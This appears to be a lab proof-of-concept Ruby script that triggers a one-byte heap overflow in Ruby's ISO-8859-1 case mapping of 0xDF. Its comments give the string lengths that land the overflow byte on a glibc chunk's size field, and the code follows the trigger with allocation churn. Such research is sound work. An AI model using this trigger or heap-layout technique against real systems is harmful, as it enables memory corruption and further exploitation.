# W361: fold-byte variant of the mixed-parity case_map driver.
# One leading 'a' then N x 0xDF gives even capa = N+21 and the single
# overflow byte at R = capa+24 = N+45. At N=27/43/59, R=72/88/104 == 8
# (mod 16): on stock glibc that is the successor chunk's size LSB.
# downcase(:fold) expands 0xDF -> 0x73 0x73 instead of upcase's 0x53 0x53.
# Run: lab/build/plain/ruby-3.4.12-plain/bin/ruby <this> 27 fold
n = (ARGV[0] || 27).to_i
op = ARGV[1] || 'fold'
s = ("a".b + "\xDF".b * n)
s.force_encoding(Encoding::ISO_8859_1)
t = (op == 'fold' ? s.downcase(:fold) : s.upcase)
print "N=#{n} mixed #{op} ok, out len=#{t.bytesize}\n"
3000.times { (Array.new(200) { "payload#{object_id}" }).join }
a = []
500.times { a << ("x" * 64) }
GC.start
print "N=#{n} mixed #{op} churn ok\n"
